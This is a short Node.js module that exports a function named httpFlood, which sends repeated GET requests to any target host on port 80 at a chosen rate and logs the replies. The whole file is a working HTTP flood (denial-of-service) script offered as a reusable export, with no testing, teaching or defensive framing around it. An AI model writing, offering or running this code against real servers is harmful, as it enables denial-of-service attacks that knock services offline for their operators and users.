const http = require('http');

function httpFlood(target, rateLimit) {
    setInterval(() => {
        const req = http.request({
            hostname: target,
            port: 80,
            path: '/',
            method: 'GET'
        }, (res) => {
            res.on('data', (chunk) => {
                console.log('Received: ' + chunk);
            });
        });

        req.on('error', (err) => {
            console.error('Error: ' + err.message);
        });

        req.end();
    }, 1000 / rateLimit);
}

module.exports = httpFlood;
